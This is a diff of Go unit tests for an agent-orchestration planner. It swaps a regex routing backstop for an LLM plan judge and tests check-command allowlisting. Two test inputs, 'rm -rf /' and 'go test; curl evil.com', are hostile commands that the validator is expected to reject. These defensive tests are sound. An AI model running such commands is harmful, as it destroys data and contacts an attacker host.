@@ -1,19 +1,24 @@
 package dag
 
 import (
+	"context"
+	"errors"
 	"slices"
+	"strings"
 	"testing"
+
+	"github.com/fagerbergj/quack/internal/vetting"
 )
 
 func testPlanner(checkCommands ...string) *Planner {
 	return NewPlanner([]AgentInfo{
 		{Name: "web-researcher"}, {Name: "synthesizer"}, {Name: "code-implementer"},
-	}, checkCommands)
+	}, checkCommands, nil)
 }
 
 func TestBuildValidatesAndStamps(t *testing.T) {
 	p := testPlanner()
-	plan, err := p.Build([]RawNode{
+	plan, err := p.Build(context.Background(), []RawNode{
 		{ID: "n1", Agent: "web-researcher", Task: "a"},
 		{ID: "n2", Agent: "web-researcher", Task: "b"},
 		{ID: "n3", Agent: "synthesizer", Task: "combine"},
@@ -47,7 +52,7 @@ func TestBuildRejectsBadPlans(t *testing.T) {
 		"cycle":         {{ID: "n1", Agent: "web-researcher", DependsOn: []string{"n2"}}, {ID: "n2", Agent: "web-researcher", DependsOn: []string{"n1"}}},
 	}
 	for name, nodes := range cases {
-		if _, err := p.Build(nodes, nil, "m", nil); err == nil {
+		if _, err := p.Build(context.Background(), nodes, nil, "m", nil); err == nil {
 			t.Errorf("%s: expected error, got nil", name)
 		}
 	}
@@ -59,7 +64,7 @@ func TestBuildRejectsBadPlans(t *testing.T) {
 // nodes (want 1)") and the whole run fails. Regression: live e2e 2026-07-05.
 func TestBuildAppendsMissingSynthesizer(t *testing.T) {
 	p := testPlanner()
-	plan, err := p.Build([]RawNode{
+	plan, err := p.Build(context.Background(), []RawNode{
 		{ID: "a", Agent: "web-researcher", Task: "research A"},
 		{ID: "b", Agent: "web-researcher", Task: "research B"},
 	}, nil, "compare", nil)
@@ -82,7 +87,7 @@ func TestBuildAppendsMissingSynthesizer(t *testing.T) {
 // nothing to fan in, no synthesizer appended.
 func TestBuildNoSynthesizerAppendedForChain(t *testing.T) {
 	p := testPlanner()
-	plan, err := p.Build([]RawNode{
+	plan, err := p.Build(context.Background(), []RawNode{
 		{ID: "a", Agent: "web-researcher", Task: "research"},
 		{ID: "b", Agent: "web-researcher", Task: "refine", DependsOn: []string{"a"}},
 	}, nil, "x", nil)
@@ -94,101 +99,32 @@ func TestBuildNoSynthesizerAppendedForChain(t *testing.T) {
 	}
 }
 
-// ---------------------------------------------------------------------------
-// Implementation-routing backstop: an implement-and-deliver request whose plan
-// has no code-implementer node is malformed. Regression: live e2e single-analyze-
-// node failure ("Add a Flappy Bird game ... and open it as a PR" collapsed to a
-// lone web-researcher analyze node — the code was never written, committed, or
-// pushed).
-// ---------------------------------------------------------------------------
-
-const flappyPR = "Add a Flappy Bird game to the repo and open it as a pull request."
-
-func TestBuildRejectsImplementationWithoutImplementerNode(t *testing.T) {
-	p := testPlanner()
-	// The orchestrator's malformed plan: a lone web-researcher "analyze" node.
-	_, err := p.Build([]RawNode{
-		{ID: "analyze-repo", Agent: "web-researcher", Task: "Analyze the GitHub repository and report its file tree, technologies, and build/lint/test commands."},
-	}, nil, flappyPR, nil)
-	if err == nil {
-		t.Fatal("Build: expected rejection — implement-and-deliver request with no code-implementer node")
-	}
-}
-
-func TestBuildAcceptsImplementationWithImplementerNode(t *testing.T) {
-	p := testPlanner()
-	_, err := p.Build([]RawNode{
-		{ID: "impl", Agent: "code-implementer", Task: "Clone the repo, implement Flappy Bird with tests, commit, push a branch, and open a PR."},
-	}, nil, flappyPR, nil)
-	if err != nil {
-		t.Fatalf("Build: a plan WITH a code-implementer node must pass: %v", err)
-	}
-}
-
-// A REVIEW plan (a code-reviewer node) must NOT be rejected even when the request
-// text reads as implement-and-deliver — a PR review's injected context carries the
-// PR's own "Add …/open a PR" title, which would otherwise trip the backstop and
-// loop the planner.
-func TestBuildDoesNotFlagReviewPlanForImplementLookingMessage(t *testing.T) {
-	p := NewPlanner([]AgentInfo{{Name: "code-reviewer"}, {Name: "code-implementer"}}, nil)
-	_, err := p.Build([]RawNode{
-		{ID: "review", Agent: "code-reviewer", Task: "Review PR #5: read the diff and post inline review comments."},
-	}, nil, flappyPR, nil)
-	if err != nil {
-		t.Fatalf("Build: a code-reviewer plan must not be rejected for an implement-looking message: %v", err)
-	}
-}
-
 // A large PR review planned as a LONE code-reviewer must be rejected and told to
 // fan out (per-file-group explorers → one reviewer); a fanned-out plan, a small
 // PR, and a roster without a code-explorer all pass.
 func TestReviewFanoutBackstop(t *testing.T) {
 	roster := []AgentInfo{{Name: "code-explorer"}, {Name: "code-reviewer"}}
-	p := NewPlanner(roster, nil)
+	p := NewPlanner(roster, nil, nil)
 	largeMsg := "Review PR #3.\n\nChanged files (3):\n  a.ts (+600/-0)\n  b.ts (+400/-10)\n  c.ts (+50/-5)\n" // churn 1065 > 800
 	smallMsg := "Review PR #7.\n\nChanged files (1):\n  a.ts (+100/-20)\n"                                    // churn 120
 
-	if _, err := p.Build([]RawNode{{ID: "r", Agent: "code-reviewer", Task: "Review the PR and post."}}, nil, largeMsg, nil); err == nil {
+	if _, err := p.Build(context.Background(), []RawNode{{ID: "r", Agent: "code-reviewer", Task: "Review the PR and post."}}, nil, largeMsg, nil); err == nil {
 		t.Error("a lone code-reviewer for a large PR must be rejected (fan out expected)")
 	}
-	if _, err := p.Build([]RawNode{
+	if _, err := p.Build(context.Background(), []RawNode{
 		{ID: "e1", Agent: "code-explorer", Task: "Review a.ts, gather findings."},
 		{ID: "e2", Agent: "code-explorer", Task: "Review b.ts and c.ts, gather findings."},
 		{ID: "r", Agent: "code-reviewer", Task: "Validate the pooled findings and post.", DependsOn: []string{"e1", "e2"}},
 	}, nil, largeMsg, nil); err != nil {
 		t.Errorf("a fanned-out large review (explorers → reviewer) must pass: %v", err)
 	}
-	if _, err := p.Build([]RawNode{{ID: "r", Agent: "code-reviewer", Task: "Review and post."}}, nil, smallMsg, nil); err != nil {
+	if _, err := p.Build(context.Background(), []RawNode{{ID: "r", Agent: "code-reviewer", Task: "Review and post."}}, nil, smallMsg, nil); err != nil {
 		t.Errorf("a small PR as one reviewer node must pass: %v", err)
 	}
 	// No code-explorer in the roster ⇒ backstop inert (can't fan out).
-	p2 := NewPlanner([]AgentInfo{{Name: "code-reviewer"}}, nil)
-	if _, err := p2.Build([]RawNode{{ID: "r", Agent: "code-reviewer", Task: "Review and post."}}, nil, largeMsg, nil); err != nil {
+	p2 := NewPlanner([]AgentInfo{{Name: "code-reviewer"}}, nil, nil)
+	if _, err := p2.Build(context.Background(), []RawNode{{ID: "r", Agent: "code-reviewer", Task: "Review and post."}}, nil, largeMsg, nil); err != nil {
 		t.Errorf("no code-explorer in the roster ⇒ backstop must be inert: %v", err)
-	}
-}
-
-// A pure-research request with no code-implementer node must NOT be flagged — the
-// backstop is conservative and never rejects a correct research plan.
-func TestBuildDoesNotFlagResearchWithoutImplementerNode(t *testing.T) {
-	p := testPlanner()
-	_, err := p.Build([]RawNode{
-		{ID: "r", Agent: "web-researcher", Task: "What are the top 3 open-source game engines in 2026?"},
-	}, nil, "What are the top 3 open-source game engines in 2026?", nil)
-	if err != nil {
-		t.Fatalf("Build: a pure-research plan must not be flagged: %v", err)
-	}
-}
-
-// When the roster has no code-implementer, the backstop is inert — a deployment
-// without that agent must not have every coding-shaped request rejected.
-func TestBuildImplementationBackstopInertWithoutImplementerAgent(t *testing.T) {
-	p := NewPlanner([]AgentInfo{{Name: "web-researcher"}, {Name: "synthesizer"}}, nil)
-	_, err := p.Build([]RawNode{
-		{ID: "r", Agent: "web-researcher", Task: "analyze the repo"},
-	}, nil, flappyPR, nil)
-	if err != nil {
-		t.Fatalf("Build: backstop must be inert when the roster has no code-implementer: %v", err)
 	}
 }
 
@@ -204,9 +140,9 @@ func TestBuildImplementationBackstopInertWithoutImplementerAgent(t *testing.T) {
 
 func TestBuildAcceptsImplementerNodeWithoutChecks(t *testing.T) {
 	p := testPlanner("npx tsc", "npx vitest")
-	_, err := p.Build([]RawNode{
+	_, err := p.Build(context.Background(), []RawNode{
 		{ID: "impl", Agent: "code-implementer", Task: "Clone, implement, commit, push, open PR."},
-	}, nil, flappyPR, nil)
+	}, nil, "Add a Flappy Bird game to the repo and open it as a pull request.", nil)
 	if err != nil {
 		t.Fatalf("Build: a code-implementer node with NO checks must be accepted (the gate derives them): %v", err)
 	}
@@ -214,33 +150,142 @@ func TestBuildAcceptsImplementerNodeWithoutChecks(t *testing.T) {
 
 func TestBuildAcceptsImplementerNodeWithChecks(t *testing.T) {
 	p := testPlanner("npx tsc", "npx vitest")
-	_, err := p.Build([]RawNode{
+	_, err := p.Build(context.Background(), []RawNode{
 		{ID: "impl", Agent: "code-implementer", Task: "Clone, implement, commit, push, open PR.",
 			Checks: []string{"npx tsc", "npx vitest run"}, Workdir: "repo"},
-	}, nil, flappyPR, nil)
+	}, nil, "Add a Flappy Bird game to the repo and open it as a pull request.", nil)
 	if err != nil {
 		t.Fatalf("Build: a code-implementer node WITH checks must pass: %v", err)
 	}
 }
 
-func TestImplementationIntent(t *testing.T) {
-	cases := map[string]bool{
-		"Add a Flappy Bird game to the repo and open it as a pull request.": true,
-		"Implement feature X in repo R and open a PR":                       true,
-		"Fix the login bug and push a branch":                               true,
-		"Create a script and commit it":                                     true,
-		"refactor the parser and merge the change":                          true,
-		// Pure research — no delivery/VCS term.
-		"What are the top 3 game engines in 2026?": false,
-		"How does the Flappy Bird physics work?":   false,
-		"Summarize the latest React release notes": false,
-		// Delivery term but no code verb — still not implementation intent.
-		"Explain what a pull request is": false,
+// ---------------------------------------------------------------------------
+// Plan-rubric judge (judgeRouting) — replaces the old regex routing backstop.
+// A fake vetting.PlanJudge stands in for the LLM so these tests don't need a
+// live model; they prove the WIRING (request/plan reach the judge, its verdict
+// drives accept/reject, and a judge error degrades gracefully) rather than any
+// particular model's judgment.
+// ---------------------------------------------------------------------------
+
+// fakePlanJudge returns a vetting.PlanJudge that records the last request/plan
+// summary it was called with and returns the canned verdict.
+func fakePlanJudge(accept bool, reason string, callErr error) (judge vetting.PlanJudge, calls *int, lastRequest, lastSummary *string) {
+	calls = new(int)
+	lastRequest = new(string)
+	lastSummary = new(string)
+	judge = func(_ context.Context, request, planSummary string) (bool, string, error) {
+		*calls++
+		*lastRequest = request
+		*lastSummary = planSummary
+		return accept, reason, callErr
 	}
-	for msg, want := range cases {
-		if got := implementationIntent(msg); got != want {
-			t.Errorf("implementationIntent(%q) = %v, want %v", msg, got, want)
+	return judge, calls, lastRequest, lastSummary
+}
+
+// A plan-only run (explore → synthesize, no code-implementer) that the judge
+// accepts must pass — the case the old regex heuristic mis-fired on (a
+// plan-only issue whose acceptance text mentions "open a PR" for the EVENTUAL
+// implementation, not this request).
+func TestJudgeRoutingAcceptsPlanOnlyPlan(t *testing.T) {
+	judge, calls, lastRequest, lastSummary := fakePlanJudge(true, "", nil)
+	p := NewPlanner([]AgentInfo{{Name: "web-researcher"}, {Name: "synthesizer"}, {Name: "code-implementer"}}, nil, judge)
+	msg := "Write a plan for adding a Flappy Bird game; the eventual implementation PR should follow repo conventions."
+	plan, err := p.Build(context.Background(), []RawNode{
+		{ID: "explore", Agent: "web-researcher", Task: "Study the repo's conventions."},
+		{ID: "write-plan", Agent: "synthesizer", Task: "Write the plan document.", DependsOn: []string{"explore"}},
+	}, nil, msg, nil)
+	if err != nil {
+		t.Fatalf("Build: a judge-accepted plan-only plan must pass: %v", err)
+	}
+	for _, n := range plan.Nodes {
+		if n.AgentName == "code-implementer" {
+			t.Errorf("plan-only plan must not carry a code-implementer node: %+v", n)
 		}
+	}
+	if *calls != 1 {
+		t.Fatalf("judge calls = %d, want 1", *calls)
+	}
+	if *lastRequest != msg {
+		t.Errorf("judge saw request %q, want %q", *lastRequest, msg)
+	}
+	if *lastSummary == "" {
+		t.Error("judge must receive a non-empty plan summary")
+	}
+}
+
+// An implement-and-deliver request whose plan has only explorer nodes (no
+// terminal code-implementer) must be rejected when the judge says so, with
+// the judge's reason surfaced in the error so the orchestrator's re-plan loop
+// can act on it.
+func TestJudgeRoutingRejectsImplementWithoutImplementerNode(t *testing.T) {
+	reason := "add a terminal code-implementer node"
+	judge, calls, _, _ := fakePlanJudge(false, reason, nil)
+	p := NewPlanner([]AgentInfo{{Name: "web-researcher"}, {Name: "code-implementer"}}, nil, judge)
+	_, err := p.Build(context.Background(), []RawNode{
+		{ID: "explore", Agent: "web-researcher", Task: "Analyze the repo."},
+	}, nil, "Add a Flappy Bird game to the repo and open it as a pull request.", nil)
+	if err == nil {
+		t.Fatal("Build: expected rejection from the judge")
+	}
+	if !strings.Contains(err.Error(), reason) {
+		t.Errorf("Build error = %q, want it to carry the judge's reason %q", err, reason)
+	}
+	if *calls != 1 {
+		t.Fatalf("judge calls = %d, want 1", *calls)
+	}
+}
+
+// A review request (a plan with no code-reviewer node) rejected by the judge
+// surfaces the same way.
+func TestJudgeRoutingRejectsReviewWithoutReviewerNode(t *testing.T) {
+	reason := "this is a review request; add a code-reviewer node"
+	judge, _, _, _ := fakePlanJudge(false, reason, nil)
+	p := NewPlanner([]AgentInfo{{Name: "web-researcher"}, {Name: "code-reviewer"}}, nil, judge)
+	_, err := p.Build(context.Background(), []RawNode{
+		{ID: "explore", Agent: "web-researcher", Task: "Summarize the PR diff."},
+	}, nil, "Review PR #5 and post your findings as inline comments.", nil)
+	if err == nil || !strings.Contains(err.Error(), reason) {
+		t.Fatalf("Build error = %v, want it to carry the judge's reason %q", err, reason)
+	}
+}
+
+// A plan WITH the right reviewer node, accepted by the judge, passes.
+func TestJudgeRoutingAcceptsReviewWithReviewerNode(t *testing.T) {
+	judge, _, _, _ := fakePlanJudge(true, "", nil)
+	p := NewPlanner([]AgentInfo{{Name: "code-reviewer"}}, nil, judge)
+	_, err := p.Build(context.Background(), []RawNode{
+		{ID: "review", Agent: "code-reviewer", Task: "Review PR #5 and post inline comments."},
+	}, nil, "Review PR #5 and post your findings as inline comments.", nil)
+	if err != nil {
+		t.Fatalf("Build: a judge-accepted review plan must pass: %v", err)
+	}
+}
+
+// A nil judge (judge stage disabled) must never block plan validation — the
+// dependency was never wired, so judgeRouting is a no-op.
+func TestJudgeRoutingNoopWhenJudgeNil(t *testing.T) {
+	p := testPlanner() // testPlanner wires judge=nil
+	_, err := p.Build(context.Background(), []RawNode{
+		{ID: "explore", Agent: "web-researcher", Task: "Analyze the repo."},
+	}, nil, "Add a Flappy Bird game to the repo and open it as a pull request.", nil)
+	if err != nil {
+		t.Fatalf("Build: a nil judge must never block plan validation: %v", err)
+	}
+}
+
+// A judge call error must degrade gracefully — allow the plan rather than
+// wedge the run on the judge's own unavailability.
+func TestJudgeRoutingDegradesGracefullyOnJudgeError(t *testing.T) {
+	judge, calls, _, _ := fakePlanJudge(false, "", errors.New("judge model unreachable"))
+	p := NewPlanner([]AgentInfo{{Name: "web-researcher"}}, nil, judge)
+	_, err := p.Build(context.Background(), []RawNode{
+		{ID: "explore", Agent: "web-researcher", Task: "Analyze the repo."},
+	}, nil, "Add a Flappy Bird game to the repo and open it as a pull request.", nil)
+	if err != nil {
+		t.Fatalf("Build: a judge error must degrade gracefully (allow), not block: %v", err)
+	}
+	if *calls != 1 {
+		t.Fatalf("judge calls = %d, want 1", *calls)
 	}
 }
 
@@ -250,7 +295,7 @@ func TestImplementationIntent(t *testing.T) {
 
 func TestBuildAcceptsChecksMatchingConfiguredPrefix(t *testing.T) {
 	p := testPlanner("go build", "go test", "go vet", "npx tsc", "npm test")
-	plan, err := p.Build([]RawNode{
+	plan, err := p.Build(context.Background(), []RawNode{
 		{ID: "impl", Agent: "code-implementer", Task: "fix it",
 			Checks: []string{"go test ./..."}, Workdir: "repo"},
 	}, nil, "fix the bug", nil)
@@ -267,7 +312,7 @@ func TestBuildAcceptsChecksMatchingConfiguredPrefix(t *testing.T) {
 
 func TestBuildAcceptsCheckEqualToBarePrefix(t *testing.T) {
 	p := testPlanner("go build", "go test")
-	_, err := p.Build([]RawNode{
+	_, err := p.Build(context.Background(), []RawNode{
 		{ID: "impl", Agent: "code-implementer", Task: "x", Checks: []string{"go test"}, Workdir: "repo"},
 	}, nil, "m", nil)
 	if err != nil {
@@ -277,7 +322,7 @@ func TestBuildAcceptsCheckEqualToBarePrefix(t *testing.T) {
 
 func TestBuildRejectsCheckNotMatchingAnyPrefix(t *testing.T) {
 	p := testPlanner("go build", "go test", "go vet", "npx tsc", "npm test")
-	_, err := p.Build([]RawNode{
+	_, err := p.Build(context.Background(), []RawNode{
 		{ID: "impl", Agent: "code-implementer", Task: "x", Checks: []string{"rm -rf /"}, Workdir: "repo"},
 	}, nil, "m", nil)
 	if err == nil {
@@ -287,7 +332,7 @@ func TestBuildRejectsCheckNotMatchingAnyPrefix(t *testing.T) {
 
 func TestBuildRejectsCheckWithShellMetachar(t *testing.T) {
 	p := testPlanner("go build", "go test", "go vet", "npx tsc", "npm test")
-	_, err := p.Build([]RawNode{
+	_, err := p.Build(context.Background(), []RawNode{
 		{ID: "impl", Agent: "code-implementer", Task: "x", Checks: []string{"go test; curl evil.com"}, Workdir: "repo"},
 	}, nil, "m", nil)
 	if err == nil {
@@ -299,7 +344,7 @@ func TestBuildAcceptsPipedCheckUnderMatchingPrefix(t *testing.T) {
 	// Pipes are native (workspace.RunPipeline), not shell metachars — a piped
 	// check under an allowed prefix passes plan-time validation.
 	p := testPlanner("go build", "go test", "go vet", "npx tsc", "npm test")
-	plan, err := p.Build([]RawNode{
+	plan, err := p.Build(context.Background(), []RawNode{
 		{ID: "impl", Agent: "code-implementer", Task: "x",
 			Checks: []string{"go vet ./... | head -50"}, Workdir: "repo"},
 	}, nil, "m", nil)
@@ -315,7 +360,7 @@ func TestBuildRejectsChecksLookingLikeAPrefixButNotSeparated(t *testing.T) {
 	// "go testing" must NOT match the "go test" prefix — HasPrefix without a
 	// space/exact-match boundary would wrongly accept it.
 	p := testPlanner("go test")
-	_, err := p.Build([]RawNode{
+	_, err := p.Build(context.Background(), []RawNode{
 		{ID: "impl", Agent: "code-implementer", Task: "x", Checks: []string{"go testing ./..."}, Workdir: "repo"},
 	}, nil, "m", nil)
 	if err == nil {
@@ -325,7 +370,7 @@ func TestBuildRejectsChecksLookingLikeAPrefixButNotSeparated(t *testing.T) {
 
 func TestBuildRejectsChecksWhenAllowlistEmpty(t *testing.T) {
 	p := testPlanner() // no check_commands configured
-	_, err := p.Build([]RawNode{
+	_, err := p.Build(context.Background(), []RawNode{
 		{ID: "impl", Agent: "code-implementer", Task: "x", Checks: []string{"go test ./..."}, Workdir: "repo"},
 	}, nil, "m", nil)
 	if err == nil {
@@ -337,7 +382,7 @@ func TestBuildAllowsNodeWithNoChecks(t *testing.T) {
 	// A node that simply omits `checks` is unaffected by the allowlist being
 	// empty — checks are opt-in per node.
 	p := testPlanner()
-	_, err := p.Build([]RawNode{
+	_, err := p.Build(context.Background(), []RawNode{
 		{ID: "impl", Agent: "code-implementer", Task: "x"},
 	}, nil, "m", nil)
 	if err != nil {
